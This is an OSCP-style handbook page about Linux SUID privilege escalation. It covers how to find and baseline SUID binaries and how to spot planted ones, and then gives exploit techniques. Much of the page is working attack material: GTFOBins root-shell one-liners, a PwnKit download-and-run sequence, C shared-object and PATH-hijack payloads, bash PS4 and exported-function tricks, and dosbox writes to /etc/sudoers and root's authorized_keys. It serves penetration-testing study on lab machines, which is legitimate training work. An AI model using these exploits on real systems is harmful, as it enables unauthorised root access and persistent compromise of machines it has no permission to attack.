---
title: "SUID Binaries"
slug: suid-binaries
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "A SUID (SetUID) binary runs with the effective UID of its owner, not the user who launched it."
---
A SUID (SetUID) binary runs with the effective UID of its owner, not the user who launched it. When the owner is root and the binary can be made to run arbitrary code, read files, or spawn a shell, that is a direct privilege escalation.

## How SUID Works

The `s` in the owner execute position marks a SUID file:

```text
-rwsr-xr-x 1 root root ... /usr/bin/passwd
```

On execution the process gets two identities: the **real UID** stays the caller, and the **effective UID** becomes the owner (root). The kernel checks the effective UID for file access, so effective UID 0 grants root's powers even though the login user is unchanged. The real/effective/saved UID model, including why `whoami` prints `root` on a successful abuse, is covered in [Linux Permissions](/collections/oscp/linux-permissions).

## Find SUID Files

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `-perm -4000`: the SUID bit is set.
- `2>/dev/null`: hide the permission-denied noise.

To catch SGID as well, with full `ls -l` output for owner and group:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

SGID root is rarer than SUID but abused the same way, through the file's group. [LinPEAS](/collections/oscp/linpeas) lists these under its SUID check and annotates known-exploitable ones.

File capabilities are a related primitive that a SUID sweep alone misses: a binary can hold a slice of root's power (`cap_setuid`, `cap_dac_read_search`) with no SUID bit set. Sweep for them separately with `getcap -r /` and abuse them per [Linux Capabilities](/collections/oscp/linux-capabilities).

## Baseline: What Is Always There

A default install ships 15 to 25 SUID root binaries and every one of them is expected. Knowing the baseline is what makes the odd entry visible, because on a real target the planted binary is one line inside forty.

Debian and Ubuntu, all normal:

```text
/usr/bin/mount            /usr/bin/su
/usr/bin/umount           /usr/bin/sudo
/usr/bin/passwd           /usr/bin/pkexec
/usr/bin/chfn             /usr/bin/newgrp
/usr/bin/chsh             /usr/bin/gpasswd
/usr/bin/fusermount       /usr/bin/at
/usr/bin/fusermount3      /usr/bin/newuidmap
/usr/bin/ping             /usr/bin/newgidmap
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/xorg/Xorg.wrap
/usr/libexec/polkit-agent-helper-1
```

Why each one is SUID, since the reason is what generalises: the `passwd`/`chfn`/`chsh`/`gpasswd`/`newgrp` group all edit `/etc/shadow` or `/etc/group`; `mount`/`umount`/`fusermount` change the namespace; `su`/`sudo`/`pkexec`/`polkit-agent-helper-1` are the authentication paths; `ping` opens a raw socket on older releases; `at` writes into the atd spool; `ssh-keysign` signs with the host key for host-based auth; `dmcrypt-get-device` and `dbus-daemon-launch-helper` are package helpers.

Guest-tools packages add one more that is not in any base list and is expected on every lab box, since they are all virtual machines:

```text
/usr/bin/vmware-user-suid-wrapper
```

It belongs to open-vm-tools and is SUID root by design. When an enumeration script flags two "uncommon" SUID binaries, this is routinely one of them, which leaves one real candidate. VirtualBox guest additions produce equivalent entries.

RHEL, CentOS, and Fedora replace a few paths and add their own:

```text
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/sbin/unix_chkpwd            /usr/sbin/usernetctl
/usr/sbin/pam_timestamp_check    /usr/sbin/mount.nfs
/usr/bin/crontab                 /usr/bin/staprun
```

Paths under `/snap/` are not extra findings. Each `/snap/core18/2066/...` tree is a read-only squashfs image of a whole base system, so it repeats the same baseline once per installed revision. Two snapd revisions and two core18 revisions is why a clean box prints forty lines. Skip the duplicates when reading the output:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v '^/snap/'
```

They are still worth one look for a different reason: a snap base is a frozen older distro, so its `sudo` or `su` can be an older build than the host's patched copy, and those images execute normally.

## Deciding Without the List

The baseline covers stock systems. Three checks settle anything the list does not, and they work on a distro never seen before.

Location. Package-managed SUID binaries live in `/usr/bin`, `/usr/sbin`, `/usr/lib`, and `/usr/libexec`. A SUID file in `/usr/local/bin`, `/opt`, `/home`, `/tmp`, `/var`, or a service directory was put there by the box's author. That alone is the finding.

Package ownership. Ask the package manager whether the file belongs to anything:

```bash
dpkg -S /usr/local/bin/backup      # "no path found matching" -> not from a package
rpm -qf /usr/local/bin/backup
```

On RPM systems the verify flag also catches a permission change on a legitimate binary, because the second column is `M` when the mode differs from what the package declares:

```bash
rpm -Va 2>/dev/null | grep '^.M'
```

`dpkg -V` only compares checksums, not modes, so a SUID bit added to a stock Debian binary shows nothing there. It does catch a replaced binary.

Timestamps. Package files share an install date; a bit set by hand later stands out. Sort the sweep by modification time and read the ends:

```bash
find / -perm -4000 -type f -printf '%T@ %M %u %p\n' 2>/dev/null | sort -n
```

All three checks fail on the easiest case of all: a stock binary left in its stock path with the bit added by hand. On Nibbles the sweep returned `/usr/bin/find` among thirteen genuine baseline entries. It is in `/usr/bin`, `dpkg -S` names findutils, and its timestamp matches everything else installed with the system, so location, ownership and mtime all say it is legitimate. Only the baseline list catches it, because `find` is not supposed to be SUID on any distribution. QuackerJack repeated it on CentOS, where `/usr/bin/find` sat at the top of an otherwise ordinary list. The anomaly is not always an odd path or an odd name, so read every line of the sweep and ask what each entry is for.

## Identify a Renamed Binary

A planted SUID binary is often a stock tool under another name, and the name is chosen to read as something weaker than it is. Ask the file what it is before deciding it is custom:

```bash
/opt/fileS --help
/opt/fileS --version
file /opt/fileS                       # ELF, dynamically linked, stripped or not
strings /opt/fileS | grep -iE 'usage|gnu|version|report bugs'
md5sum /opt/fileS /usr/bin/find       # identical means a plain copy
```

`--help` is the fastest of these because GNU tools print their real usage line and their upstream project URL regardless of `argv[0]`.

MZEEAV had `/opt/fileS` set SUID root. The name reads as `file`, which on GTFOBins is only a file-read primitive, and running it as `file` returns vocabulary that belongs to something else:

```text
/opt/fileS -f /tmp/revshell.sh
/opt/fileS: unknown predicate `-f'
```

`predicate` is `find` terminology, and `--help` confirmed GNU findutils. That changed the payload from reading a file to a direct root shell:

```bash
/opt/fileS . -exec /bin/sh -p \; -quit
```

An error message in the wrong vocabulary is the tell in general. Match it to the tool that owns it rather than to the filename.

## Never SUID

These have no reason to carry the bit and are an immediate root path through GTFOBins under the SUID function:

`bash`, `sh`, `dash`, `find`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, `tar`, `zip`, `awk`, `sed`, `nmap`, `python`, `perl`, `ruby`, `php`, `node`, `env`, `ftp`, `git`, `docker`, `systemctl`, `strace`, `gdb`, `base64`, `cat`, `head`, `tail`.

Anything custom-named (`backup`, `check-file`, `suid-so`, `run-report`) belongs here too, since it was compiled for this box. Reverse it with `strings` and `ltrace` per the PATH and shared object sections below.

## Version the Baseline

The rest of the baseline is not automatically safe. Four entries carry local root CVEs and sit on every box, so they get versioned rather than skipped:

```bash
pkexec --version        # <= 0.120 -> CVE-2021-4034 PwnKit
sudo --version          # < 1.9.5p2 -> CVE-2021-3156 Baron Samedit
snap version            # < 2.54.3  -> CVE-2021-44731 snap-confine
/usr/sbin/exim4 --version
```

`at` is SUID by design and appears on GTFOBins, but atd runs the queued job as the submitting user, so it is not a direct escalation on its own.

## SUID bash

InfoSecPrep had `/usr/bin/bash` set SUID root:

```text
-rwsr-sr-x 1 root root 1.2M /usr/bin/bash
```

Abuse it with the privileged flag:

```bash
/bin/bash -p
```

bash defends against SUID abuse by resetting the effective UID back to the real UID at startup when they differ. `-p` (privileged mode) skips that reset, so the shell keeps effective UID 0:

```text
bash-5.0# whoami
root
```

Without `-p`, the same SUID bash drops back to the calling user and gives nothing.

## start-stop-daemon

Debian's helper for starting and stopping services, called from init scripts that already run as root, so it has no reason to be SUID and is not on a stock install. `-x` names any executable to launch and `--` passes arguments to it, which makes it a general "run this program" primitive:

```bash
/usr/sbin/start-stop-daemon -n pwn -S -x /bin/bash -- -p
```

```text
bash-5.0# whoami
root
```

The `-n` is not decoration and the exploit does nothing without it. `-S` means "ensure this is running", not "run this", so `start-stop-daemon` scans `/proc` for a matching process first and exits successfully without starting anything if it finds one. The criteria given through `-x`, `-n`, `-p` and `-u` are combined with AND, and `-x /bin/bash` on its own asks whether any process on the box is running `/bin/bash`, which the caller's own shell answers:

```text
/bin/bash already running.
```

Adding `-n pwn` requires a process that is simultaneously named `pwn` and executing `/bin/bash`. Nothing matches, the check fails, and a failed check is what makes it start the program. The name is arbitrary and only has to be one no running process holds.

Two more shapes of the same mistake. `-x` takes a path, not a command resolved through `PATH`, so a bare name returns `unable to stat //whoami (No such file or directory)`. And the binary lives in `/usr/sbin`, which is absent from `PATH` on a non-login SSH session, so `command not found` from a shell obtained that way means the path, not a missing file.

`-p` after `--` reaches bash and keeps the effective UID at 0, for the same reason as [SUID Binaries SUID bash](/collections/oscp/suid-binaries#suid-bash) above. This was the root on Sorcerer.

## strace

`strace` runs a program under a syscall trace, so a SUID root strace launches the traced program as root. On Image the sweep flagged it as an uncommon SUID binary:

```text
/usr/bin/strace
```

GTFOBins spawns a shell through it:

```bash
strace -o /dev/null /bin/sh -p
```

`-o /dev/null` sends the trace log to nowhere so it does not bury the prompt, and `-p` stops `/bin/sh` dropping the effective UID, the same reason as [SUID Binaries SUID bash](/collections/oscp/suid-binaries#suid-bash).

## Other Common One-Liners

From GTFOBins, when the named binary is SUID root:

```bash
# find
find . -exec /bin/sh -p \; -quit

# cp: overwrite a sensitive file, or read one
# nmap (interactive, old versions)
nmap --interactive
# then: !sh

# vim
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# wget: --use-askpass runs an external program as the password-prompt handler,
# at the SUID owner's privileges
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/tmp/temp
chmod +x /tmp/temp
wget --use-askpass=/tmp/temp 0
```

`wget` set SUID root was the path on XposedAPI; it is not on any stock distribution's baseline, so it stood out immediately against [SUID Binaries Baseline What Is Always There](/collections/oscp/suid-binaries#baseline-what-is-always-there).

The `-p` on the spawned shell matters for the same reason as bash: it preserves the elevated effective UID. An alternative to `-p` is to call `os.setuid(0)` inside the Python before spawning the shell, which sets the real and effective UID to 0 outright:

```bash
vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

`vim.basic` is the real binary behind the `vim` symlink and is the name to run when the SUID bit is on it.

Interactive editors (`vim`, `less`, `nano`) cannot drive themselves without a real terminal. Run their GTFOBins exploit inside a raw catch and vim fails with `E79: Cannot expand wildcards` looping on the screen. Upgrade to a PTY first (see [Reverse Shells](/collections/oscp/reverse-shells)); the trailing `reset; exec sh` then cleans up the terminal state vim leaves behind. This was the trap on Shakabrah.

## SUID Interpreters and Picking the Variant

php was SUID root on Astronaut:

```text
-rwsr-xr-x 1 root root 4.6M /usr/bin/php7.4
```

GTFOBins lists several php shell payloads and only some of them escalate. The ones that stay at the caller's UID all spawn `/bin/sh -i` with no `-p`:

```bash
php -r 'system("/bin/sh -i");'
php -r 'passthru("/bin/sh -i");'
php -r '$h=@popen("/bin/sh -i","r"); while(!feof($h)) echo fread($h,4096);'
```

The `pcntl_exec` variant passes `-p`, so the shell keeps effective UID 0:

```bash
php -r 'pcntl_exec("/bin/sh", ["-p"]);'   # root
```

The deciding factor is the `-p`, not the PHP function. `system`, `passthru`, and `popen` are interchangeable ways to run a command (GTFOBins lists all three as fallbacks in case `disable_functions` blocks some), and any of them escalates once the shell gets `-p`:

```bash
php -r 'system("/bin/sh -p");'            # also root
```

All of these live under the same **SUID** heading on GTFOBins. The tell is the note GTFOBins pins to the shell-based ones:

> This executable runs commands using the system shell, e.g., via functions like `system`, so it only works for distributions where the shell does not drop SUID privileges.

Modern dash and bash do drop SUID privileges, so on a current Ubuntu those variants return the caller's UID. The `pcntl_exec("/bin/sh", ["-p"])` entry carries no such note, because `-p` keeps the effective UID and `pcntl_exec` replaces the process image directly instead of routing through `sh -c`.

So the rule for any SUID interpreter: pick the payload with no "shell does not drop SUID privileges" caveat, which is the one that either hands the shell `-p` or sets the interpreter's own UID to 0 first (`posix_setuid(0)` in php, `os.setuid(0)` in python, see the Levram capability case). `pcntl_exec` is also worth preferring because `pcntl_*` is often left out of `disable_functions`.

## Known Exploits in SUID Binaries

Some packages install SUID helpers that carry their own CVEs, the same as a service does. Version the unusual ones and search:

```bash
/usr/sbin/exim-4.84-3 --version      # version is often in the filename
searchsploit exim 4.84
```

A downloaded exploit script may arrive with CRLF line endings. Strip them before running:

```bash
sed -e 's/^M//' 39535.sh > privesc.sh   # ^M is Ctrl-V then Ctrl-M
chmod +x privesc.sh
```

Same hunt as [Service Exploits](/collections/oscp/service-exploits).

## pkexec PwnKit (CVE-2021-4034)

`pkexec` is a standard SUID binary, so it sits on the baseline and is easy to skip, but any version up to the January 2022 patch is vulnerable to CVE-2021-4034 (PwnKit), a local root that works regardless of SELinux mode. Version it before dismissing it:

```bash
pkexec --version    # 0.112 on Snookums, vulnerable
```

Two exploit forms circulate. The shell-script build compiles on target and needs gcc; the standalone build is a precompiled ELF. On a box without a compiler, use the precompiled binary and run it from disk. Piping it into a shell fails, since bash cannot interpret an ELF:

```bash
wget http://KALI/PwnKit
chmod +x PwnKit
./PwnKit            # root
```

## dosbox

dosbox has no shell-spawn entry on GTFOBins; its SUID function is arbitrary file read/write. `mount c /` maps the real filesystem root onto the emulated DOS `C:` drive, and dosbox's internal shell does not drop the SUID effective privileges when it opens files through that mount, so a write goes through as root regardless of the target's real ownership:

```bash
dosbox -c 'mount c /' -c "echo DATA >>C:/path/to/file" -c exit
```

DOS paths under the mount are the real path with backslashes; `C:/` with forward slashes also works since DOSBox's shell accepts either.

The payload has to be short. DOSBox's shell inherits DOS's own command-line length limit (the classic ~127-byte `command.com` buffer), and a long `echo` argument gets truncated with no error at all, the command reports success and the file changes, but the content is cut. On Nukem this broke an attempt to write an RSA public key into `/root/.ssh/authorized_keys`: the write went through silently, but the truncated key never matched anything and SSH kept falling back to a password prompt. Two ways around it:

- Pick a short payload. A single `/etc/sudoers` line (`user ALL=(ALL:ALL) ALL`) fits comfortably and needs no workaround, which is what worked on Nukem.
- Stage the full payload in a file first, with a normal shell that has no such limit, and use dosbox's `copy` to move it into place instead of `echo` to construct it inline:

```bash
echo "ssh-rsa AAAA... user@host" > /tmp/k.pub
dosbox -c 'mount c /' -c 'mkdir C:/root/.ssh' -c 'copy C:/tmp/k.pub C:/root/.ssh/authorized_keys' -c exit
```

`copy` just moves bytes that already exist at full length, so nothing about the DOS command line's own size limit applies to the content being written.

## Shared Object Injection

A SUID binary that loads a shared object from a writable path can be hijacked. Find the missing object with `strace`:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT
```

An `open()` on a writable path returning `ENOENT` is the hook. Compile a shared object with a constructor that spawns a shell and drop it at that path:

```c
// libcalc.c
#include <stdlib.h>
#include <unistd.h>
static void inject() __attribute__((constructor));
void inject() { setuid(0); system("/bin/bash -p"); }
```

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
/usr/local/bin/suid-so     # loads the object -> root
```

### Named Symbol via dlsym

Some loaders call `dlsym()` for a specific exported function instead of relying on a constructor, and bail out if that symbol is missing rather than running whatever the object provides. `strings` on the binary reveals this without needing to run it, since the expected path and the expected symbol name are both baked in as literals:

```bash
strings /path/to/suid-binary | grep -iE "\.so|plugin|init"
```

```text
/home/ted/.lib/libsecurity.so
init_plugin
Function not found in the library!
```

The payload has to export a function under that exact name instead of a constructor, since the binary calls the pointer `dlsym()` returns:

```c
// libsecurity.c
#include <stdlib.h>
#include <unistd.h>
void init_plugin(void) { setuid(0); system("/bin/bash -p"); }
```

```bash
mkdir -p /home/ted/.lib
gcc -shared -fPIC -o /home/ted/.lib/libsecurity.so libsecurity.c
/path/to/suid-binary      # loads the object, resolves init_plugin -> root
```

The path is a literal baked into the binary, not derived from `$HOME`, so use it exactly as `strings` printed it rather than assuming it sits under the current user's own home. It is only exploitable if that exact path is writable by whoever is running the binary, which can mean a different user's home directory was left world-writable by mistake, as opposed to anything under the caller's own `~`.

Match the signature `dlsym` expects if the binary casts the pointer and calls it with arguments; a mismatched signature can crash the loader instead of running the payload. `void init_plugin(void)` is the safe default when nothing in the `strings` output suggests otherwise.

## PATH Abuse

If the SUID binary calls another program by bare name through `system()`, the shell resolves it via `PATH`. Find the call with `strings`, `strace`, or `ltrace`:

```bash
strings /usr/local/bin/suid-env                       # "service apache2 start"
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
ltrace /usr/local/bin/suid-env 2>&1 | grep service    # system("service ...")
```

`service` has no absolute path, so a planted copy earlier in `PATH` runs instead:

```c
// system.c
#include <stdlib.h>
int main() { setuid(0); system("/bin/bash -p"); }
```

```bash
gcc -o service system.c
PATH=.:$PATH /usr/local/bin/suid-env    # -> root
```

If the call uses an absolute path (`/usr/sbin/service`), `PATH` does nothing. Use the shell-feature tricks below.

## Abusing Shell Features

When the SUID binary calls an absolute path through `/bin/sh` (bash), `PATH` abuse does not apply, but two bash behaviours help. Both are version-bound.

Exported function (bash < 4.2-048): an exported bash function is inherited by child shells, and old bash let a function be named after a full path, then ran that function in place of the real binary at that path. Define a function named after the absolute path the binary calls and export it. The SUID binary launches a shell as root to run the command, that shell inherits the function, and the name matches so the function runs instead of the real program:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2      # -> root
```

PS4 with xtrace (bash < 4.4): with `xtrace` on, bash prints `PS4` before running each command, and expanding `PS4` executes any `$(...)` inside it, at the SUID owner's privileges. Set `PS4` to a command that plants a root shell before the binary runs its own command. `env -i SHELLOPTS=xtrace` sets the trace option at launch because `SHELLOPTS` is read-only inside a running shell. The payload copies bash to `/tmp` as SUID root:

```bash
env -i SHELLOPTS=xtrace \
  PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' \
  /usr/local/bin/suid-env2
/tmp/rootbash -p
```

bash 4.4 and above ignores `PS4` for shells running as root, so this is version-bound.

## Why Not LD_PRELOAD Here

The sudo `LD_PRELOAD` and `LD_LIBRARY_PATH` tricks (see [Sudo](/collections/oscp/sudo)) do not work on SUID binaries. The dynamic linker ignores those variables for set-user-ID programs by design. Shared object injection above works because it abuses a path the binary itself opens, not the linker's preload list.
